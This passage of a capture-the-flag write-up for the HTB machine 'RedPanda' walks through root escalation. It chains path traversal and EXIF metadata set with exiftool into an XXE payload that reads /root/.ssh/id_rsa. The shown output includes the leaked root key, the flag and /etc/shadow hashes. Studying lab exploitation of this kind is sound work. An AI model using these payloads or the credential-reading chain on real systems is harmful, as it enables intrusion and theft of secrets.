+<div class="sourceCode" id="cb13"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="co">// MAIN</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="bu">Map</span> parsed_data <span class="op">=</span> <span class="fu">parseLog</span><span class="op">(</span>line<span class="op">);</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="bu">System</span><span class="op">.</span><span class="fu">out</span><span class="op">.</span><span class="fu">println</span><span class="op">(</span>parsed_data<span class="op">.</span><span class="fu">get</span><span class="op">(</span><span class="st">"uri"</span><span class="op">));</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><br>3, The <code>uri</code> parameter is sent to <code>getArtist</code> function where it will look for the image in <code>/opt/panda_search/src/main/resources/static</code>, which is the default path for the <code>img</code> directory where all red panda images are stored. Since we controll <code>uri</code> we can use path traversal and look for the image else where, example <code>/../../../../../../dev/shm/e.jpg</code>.</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="co">// MAIN</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> artist <span class="op">=</span> <span class="fu">getArtist</span><span class="op">(</span>parsed_data<span class="op">.</span><span class="fu">get</span><span class="op">(</span><span class="st">"uri"</span><span class="op">).</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="co">// getArtist</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="dt">static</span> <span class="bu">String</span> <span class="fu">getArtist</span><span class="op">(</span><span class="bu">String</span> uri<span class="op">)</span> <span class="kw">throws</span> <span class="bu">IOException</span><span class="op">,</span> JpegProcessingException <span class="op">{</span></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span> fullpath <span class="op">=</span> <span class="st">"/opt/panda_search/src/main/resources/static"</span> <span class="op">+</span> uri<span class="op">;</span></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>    <span class="bu">File</span> jpgFile <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span>fullpath<span class="op">);</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><br>4, The meta data from found image will be checked, and the value of <code>Artist</code> will be returned to main, which will be used to create a path to a XML-file. Since we’re pointing to our custom image, we can controll the metadata with <code>exiftool</code> and use path traversal again to our own XML-file. Example, <code>exiftool -Artist="../dev/shm/pwn" e.jpg</code>, creating the xmlPath <code>/credits/../dev/shm/pwn_creds.xml</code>.</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co">// getArtist</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a> Metadata metadata <span class="op">=</span> JpegMetadataReader<span class="op">.</span><span class="fu">readMetadata</span><span class="op">(</span>jpgFile<span class="op">);</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a> <span class="cf">for</span> <span class="op">(</span>Directory dir <span class="op">:</span> metadata<span class="op">.</span><span class="fu">getDirectories</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span>Tag tag <span class="op">:</span> dir<span class="op">.</span><span class="fu">getTags</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>tag<span class="op">.</span><span class="fu">getTagName</span><span class="op">()</span> <span class="op">==</span> <span class="st">"Artist"</span><span class="op">)</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>     <span class="cf">return</span> tag<span class="op">.</span><span class="fu">getDescription</span><span class="op">();</span> </span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="co">// MAIN</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a> <span class="bu">System</span><span class="op">.</span><span class="fu">out</span><span class="op">.</span><span class="fu">println</span><span class="op">(</span><span class="st">"Artist: "</span> <span class="op">+</span> artist<span class="op">);</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a> <span class="bu">String</span> xmlPath <span class="op">=</span> <span class="st">"/credits/"</span> <span class="op">+</span> artist <span class="op">+</span> <span class="st">"_creds.xml"</span><span class="op">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><br>5, Lastly all our controlled data is sent to function <code>addViewTo</code>, <code>xmlPath</code> is set to <code>/credits/../dev/shm/pwn_creds.xml</code> and <code>uri</code> to <code>/../../../../../../dev/shm/e.jpg</code>. - The element <code>uri</code> (in the XML-file) is compared to variable <code>uri</code> to make sure they are the same. This means that we need to set <code>&lt;uri&gt;/../../../../../../dev/shm/e.jpg&lt;/uri&gt;</code> in our XML, else this wont pass - <code>totalviews</code> are calculated, meaning we need to have <code>&lt;totalviews&gt;&lt;/totalviews&gt;</code> in our XML - <code>views</code> are calculcated, same as above, we need to have <code>&lt;views&gt;&lt;/views&gt;</code> in our XML</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="co">// MAIN</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="fu">addViewTo</span><span class="op">(</span>xmlPath<span class="op">,</span> parsed_data<span class="op">.</span><span class="fu">get</span><span class="op">(</span><span class="st">"uri"</span><span class="op">).</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="co">// addViewTo</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="bu">File</span> fd <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span>path<span class="op">);</span></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>    <span class="bu">Document</span> doc <span class="op">=</span> saxBuilder<span class="op">.</span><span class="fu">build</span><span class="op">(</span>fd<span class="op">);</span></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a>    <span class="bu">Element</span> rootElement <span class="op">=</span> doc<span class="op">.</span><span class="fu">getRootElement</span><span class="op">();</span></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="bu">Element</span> el <span class="op">:</span> rootElement<span class="op">.</span><span class="fu">getChildren</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>el<span class="op">.</span><span class="fu">getName</span><span class="op">()</span> <span class="op">==</span> <span class="st">"image"</span><span class="op">)</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>el<span class="op">.</span><span class="fu">getChild</span><span class="op">(</span><span class="st">"uri"</span><span class="op">).</span><span class="fu">getText</span><span class="op">().</span><span class="fu">equals</span><span class="op">(</span>uri<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a>          <span class="bu">Integer</span> totalviews <span class="op">=</span> <span class="bu">Integer</span><span class="op">.</span><span class="fu">valueOf</span><span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">parseInt</span><span class="op">(</span>rootElement<span class="op">.</span><span class="fu">getChild</span><span class="op">(</span><span class="st">"totalviews"</span><span class="op">).</span><span class="fu">getText</span><span class="op">())</span> <span class="op">+</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>          <span class="bu">System</span><span class="op">.</span><span class="fu">out</span><span class="op">.</span><span class="fu">println</span><span class="op">(</span><span class="st">"Total views:"</span> <span class="op">+</span> <span class="bu">Integer</span><span class="op">.</span><span class="fu">toString</span><span class="op">(</span>totalviews<span class="op">.</span><span class="fu">intValue</span><span class="op">()));</span></span>
+<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a>          rootElement<span class="op">.</span><span class="fu">getChild</span><span class="op">(</span><span class="st">"totalviews"</span><span class="op">).</span><span class="fu">setText</span><span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">toString</span><span class="op">(</span>totalviews<span class="op">.</span><span class="fu">intValue</span><span class="op">()));</span></span>
+<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a>          <span class="bu">Integer</span> views <span class="op">=</span> <span class="bu">Integer</span><span class="op">.</span><span class="fu">valueOf</span><span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">parseInt</span><span class="op">(</span>el<span class="op">.</span><span class="fu">getChild</span><span class="op">(</span><span class="st">"views"</span><span class="op">).</span><span class="fu">getText</span><span class="op">()));</span></span>
+<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a>          el<span class="op">.</span><span class="fu">getChild</span><span class="op">(</span><span class="st">"views"</span><span class="op">).</span><span class="fu">setText</span><span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">toString</span><span class="op">(</span>views<span class="op">.</span><span class="fu">intValue</span><span class="op">()</span> <span class="op">+</span> <span class="dv">1</span><span class="op">));</span></span>
+<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span>  </span>
+<span id="cb16-17"><a href="#cb16-17" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>With all this in mind, we can download one of the xml-files at <code>/credits/</code> and use as a base. Remember that the file name here is important as it will work together with the image metadata.</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda cat pwn_creds.xml</span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span><span class="ex">?xml</span> version=<span class="st">"1.0"</span> encoding=<span class="st">"UTF-8"</span><span class="pp">?</span><span class="op">&gt;</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>!DOCTYPE <span class="ex">foo</span> [ <span class="op">&lt;</span>!ENTITY xxe SYSTEM <span class="st">"file:///root/.ssh/id_rsa"</span><span class="op">&gt;</span> ]<span class="op">&gt;</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>credits<span class="op">&gt;</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>author<span class="op">&gt;</span>pwn<span class="op">&lt;</span>/author<span class="op">&gt;</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>image<span class="op">&gt;</span></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>uri<span class="op">&gt;</span>/../../../../../../dev/shm/e.jpg<span class="op">&lt;</span>/uri<span class="op">&gt;</span></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>foo<span class="op">&gt;&amp;</span>xxe<span class="kw">;</span><span class="op">&lt;</span>/foo<span class="op">&gt;</span></span>
+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>/image<span class="op">&gt;</span></span>
+<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>totalviews<span class="op">&gt;</span>0<span class="op">&lt;</span>/totalviews<span class="op">&gt;</span></span>
+<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>/credits<span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Next, change the metadata of a random image:</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda exiftool <span class="at">-Artist</span><span class="op">=</span><span class="st">"../dev/shm/pwn"</span> e.jpg</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda exiftool e.jpg <span class="kw">|</span> <span class="fu">grep</span> Artist</span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Artist</span>                          : ../dev/shm/pwn</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Upload the xml and image to the victim, and write your path traversal in <code>redpanda.log</code>. Wait for maximum two minutes until the jar is executed again and the xml-file should now contain the content of root <code>id_rsa</code>.</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/dev/shm$</span> wget http://10.10.14.6:8888/pwn_creds.xml</span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/dev/shm$</span> wget http://10.10.14.6:8888/e.jpg</span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/dev/shm$</span> echo <span class="st">"200||IP-ADDR||USERAGENT||/../../../../../../dev/shm/e.jpg"</span> <span class="op">&gt;</span> /opt/panda_search/redpanda.log</span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/dev/shm$</span> cat pwn_creds.xml</span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span><span class="ex">?xml</span> version=<span class="st">"1.0"</span> encoding=<span class="st">"UTF-8"</span><span class="pp">?</span><span class="op">&gt;</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>!DOCTYPE <span class="ex">foo</span><span class="op">&gt;</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>credits<span class="op">&gt;</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>author<span class="op">&gt;</span>pwn<span class="op">&lt;</span>/author<span class="op">&gt;</span></span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>image<span class="op">&gt;</span></span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>uri<span class="op">&gt;</span>/../../../../../../dev/shm/e.jpg<span class="op">&lt;</span>/uri<span class="op">&gt;</span></span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>foo<span class="op">&gt;</span>-----BEGIN <span class="ex">OPENSSH</span> PRIVATE KEY-----</span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a><span class="ex">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span></span>
+<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a><span class="ex">QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29</span></span>
+<span id="cb19-15"><a href="#cb19-15" aria-hidden="true" tabindex="-1"></a><span class="ex">ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ</span></span>
+<span id="cb19-16"><a href="#cb19-16" aria-hidden="true" tabindex="-1"></a><span class="ex">AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ</span></span>
+<span id="cb19-17"><a href="#cb19-17" aria-hidden="true" tabindex="-1"></a><span class="va">RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE</span><span class="op">=</span></span>
+<span id="cb19-18"><a href="#cb19-18" aria-hidden="true" tabindex="-1"></a><span class="ex">-----END</span> OPENSSH PRIVATE KEY-----<span class="op">&lt;</span>/foo<span class="op">&gt;</span></span>
+<span id="cb19-19"><a href="#cb19-19" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>views<span class="op">&gt;</span>1<span class="op">&lt;</span>/views<span class="op">&gt;</span></span>
+<span id="cb19-20"><a href="#cb19-20" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>/image<span class="op">&gt;</span></span>
+<span id="cb19-21"><a href="#cb19-21" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>totalviews<span class="op">&gt;</span>1<span class="op">&lt;</span>/totalviews<span class="op">&gt;</span></span>
+<span id="cb19-22"><a href="#cb19-22" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>/credits<span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Write to file, login and win.</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda vim root-id_rsa</span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda chmod 400 root-id_rsa </span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda ssh root@redpanda.htb <span class="at">-i</span> root-id_rsa</span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="ex">root@redpanda:~#</span> id</span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="ex">root@redpanda:~#</span> cat root.txt </span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a><span class="ex">84d3faba94901c92ecd00838f38ef288</span></span>
+<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a><span class="ex">root@redpanda:~#</span> cat /etc/shadow</span>
+<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a><span class="ex">root:</span><span class="va">$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL</span><span class="ex">/l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7:::</span></span>
+<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk:</span><span class="va">$6$4</span><span class="ex">8BoRAl2LvBK8Zth</span><span class="va">$vpJzroFTUyQRA</span><span class="ex">/UQKu64uzNF6L7pceYAe.B14kmSgvKCvjTm6Iu/hSEZTTT8EFbGKNIbT3e2ox3qqK/MJRJIJ1:19157:0:99999:7:::</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="references" class="level2">
+<h2 class="anchored" data-anchor-id="references">References</h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/xxe">PortSwigger - XXE</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java">PayloadAllTheThings - SSTI</a></li>
+</ul>
+
+
+</section>
+</section>
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+window.document.addEventListener("DOMContentLoaded", function (event) {
+  const toggleBodyColorMode = (bsSheetEl) => {
+    const mode = bsSheetEl.getAttribute("data-mode");
+    const bodyEl = window.document.querySelector("body");
+    if (mode === "dark") {
+      bodyEl.classList.add("quarto-dark");
+      bodyEl.classList.remove("quarto-light");
+    } else {
+      bodyEl.classList.add("quarto-light");
+      bodyEl.classList.remove("quarto-dark");
+    }
+  }
+  const toggleBodyColorPrimary = () => {
+    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
+    if (bsSheetEl) {
+      toggleBodyColorMode(bsSheetEl);
+    }
+  }
+  toggleBodyColorPrimary();  
+  const icon = "";
+  const anchorJS = new window.AnchorJS();
+  anchorJS.options = {
+    placement: 'right',
+    icon: icon
+  };
+  anchorJS.add('.anchored');
+  const isCodeAnnotation = (el) => {
+    for (const clz of el.classList) {
+      if (clz.startsWith('code-annotation-')) {                     
+        return true;
+      }
+    }
+    return false;
+  }
+  const onCopySuccess = function(e) {
+    // button target
+    const button = e.trigger;
+    // don't keep focus
+    button.blur();
+    // flash "checked"
+    button.classList.add('code-copy-button-checked');
+    var currentTitle = button.getAttribute("title");
+    button.setAttribute("title", "Copied!");
+    let tooltip;
+    if (window.bootstrap) {
+      button.setAttribute("data-bs-toggle", "tooltip");
+      button.setAttribute("data-bs-placement", "left");
+      button.setAttribute("data-bs-title", "Copied!");
+      tooltip = new bootstrap.Tooltip(button, 
+        { trigger: "manual", 
+          customClass: "code-copy-button-tooltip",
+          offset: [0, -8]});
+      tooltip.show();    
+    }
+    setTimeout(function() {
+      if (tooltip) {
+        tooltip.hide();
+        button.removeAttribute("data-bs-title");
+        button.removeAttribute("data-bs-toggle");
+        button.removeAttribute("data-bs-placement");
+      }
+      button.setAttribute("title", currentTitle);
+      button.classList.remove('code-copy-button-checked');
+    }, 1000);
+    // clear code selection
+    e.clearSelection();
+  }
+  const getTextToCopy = function(trigger) {
+      const codeEl = trigger.previousElementSibling.cloneNode(true);
+      for (const childEl of codeEl.children) {
+        if (isCodeAnnotation(childEl)) {
+          childEl.remove();
+        }
+      }
+      return codeEl.innerText;
+  }
+  const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+    text: getTextToCopy
+  });
+  clipboard.on('success', onCopySuccess);
+  if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+    // For code content inside modals, clipBoardJS needs to be initialized with a container option
+    // TODO: Check when it could be a function (https://github.com/zenorocha/clipboard.js/issues/860)
+    const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+      text: getTextToCopy,
+      container: window.document.getElementById('quarto-embedded-source-code-modal')
+    });
+    clipboardModal.on('success', onCopySuccess);
+  }
+    var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+    var mailtoRegex = new RegExp(/^mailto:/);
+      var filterRegex = new RegExp("https:\/\/exploit\.se");
+    var isInternal = (href) => {
+        return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+    }
+    // Inspect non-navigation links and adorn them if external
+ 	var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+    for (var i=0; i<links.length; i++) {
+      const link = links[i];
+      if (!isInternal(link.href)) {
+        // undo the damage that might have been done by quarto-nav.js in the case of
+        // links that we want to consider external
+        if (link.dataset.originalHref !== undefined) {
+          link.href = link.dataset.originalHref;
+        }
+      }
+    }
+  function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+    const config = {
+      allowHTML: true,
+      maxWidth: 500,
+      delay: 100,
+      arrow: false,
+      appendTo: function(el) {
+          return el.parentElement;
+      },
+      interactive: true,
+      interactiveBorder: 10,
+      theme: 'quarto',
+      placement: 'bottom-start',
+    };
+    if (contentFn) {
+      config.content = contentFn;
+    }
+    if (onTriggerFn) {
+      config.onTrigger = onTriggerFn;
+    }
+    if (onUntriggerFn) {
+      config.onUntrigger = onUntriggerFn;
+    }
+    window.tippy(el, config); 
+  }
+  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+  for (var i=0; i<noterefs.length; i++) {
+    const ref = noterefs[i];
+    tippyHover(ref, function() {
+      // use id or data attribute instead here
+      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+      try { href = new URL(href).hash; } catch {}
+      const id = href.replace(/^#\/?/, "");
+      const note = window.document.getElementById(id);
+      if (note) {
+        return note.innerHTML;
+      } else {
+        return "";
+      }
+    });
+  }
+  const xrefs = window.document.querySelectorAll('a.quarto-xref');
+  const processXRef = (id, note) => {
+    // Strip column container classes
+    const stripColumnClz = (el) => {
+      el.classList.remove("page-full", "page-columns");
+      if (el.children) {
+        for (const child of el.children) {
+          stripColumnClz(child);
+        }
+      }
+    }
+    stripColumnClz(note)
+    if (id === null || id.startsWith('sec-')) {
+      // Special case sections, only their first couple elements
+      const container = document.createElement("div");
+      if (note.children && note.children.length > 2) {
+        container.appendChild(note.children[0].cloneNode(true));
+        for (let i = 1; i < note.children.length; i++) {
+          const child = note.children[i];
+          if (child.tagName === "P" && child.innerText === "") {
+            continue;
+          } else {
+            container.appendChild(child.cloneNode(true));
+            break;
+          }
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(container);
+        }
+        return container.innerHTML
+      } else {
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        return note.innerHTML;
+      }
+    } else {
+      // Remove any anchor links if they are present
+      const anchorLink = note.querySelector('a.anchorjs-link');
+      if (anchorLink) {
+        anchorLink.remove();
+      }
+      if (window.Quarto?.typesetMath) {
+        window.Quarto.typesetMath(note);
+      }
+      // TODO in 1.5, we should make sure this works without a callout special case
+      if (note.classList.contains("callout")) {
+        return note.outerHTML;
+      } else {
+        return note.innerHTML;
+      }
+    }
+  }
+  for (var i=0; i<xrefs.length; i++) {
+    const xref = xrefs[i];
+    tippyHover(xref, undefined, function(instance) {
+      instance.disable();
+      let url = xref.getAttribute('href');
+      let hash = undefined; 
+      if (url.startsWith('#')) {
+        hash = url;
+      } else {
+        try { hash = new URL(url).hash; } catch {}
+      }
+      if (hash) {
+        const id = hash.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note !== null) {
+          try {
+            const html = processXRef(id, note.cloneNode(true));
+            instance.setContent(html);
+          } finally {
+            instance.enable();
+            instance.show();
+          }
+        } else {
+          // See if we can fetch this
+          fetch(url.split('#')[0])
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.getElementById(id);
+            if (note !== null) {
+              const html = processXRef(id, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      } else {
+        // See if we can fetch a full url (with no hash to target)
+        // This is a special case and we should probably do some content thinning / targeting
+        fetch(url)
+        .then(res => res.text())
+        .then(html => {
+          const parser = new DOMParser();
+          const htmlDoc = parser.parseFromString(html, "text/html");
+          const note = htmlDoc.querySelector('main.content');
+          if (note !== null) {
+            // This should only happen for chapter cross references
+            // (since there is no id in the URL)
+            // remove the first header
+            if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+              note.children[0].remove();
+            }
+            const html = processXRef(null, note);
+            instance.setContent(html);
+          } 
+        }).finally(() => {
+          instance.enable();
+          instance.show();
+        });
+      }
+    }, function(instance) {
+    });
+  }
+      let selectedAnnoteEl;
+      const selectorForAnnotation = ( cell, annotation) => {
+        let cellAttr = 'data-code-cell="' + cell + '"';
+        let lineAttr = 'data-code-annotation="' +  annotation + '"';
+        const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+        return selector;
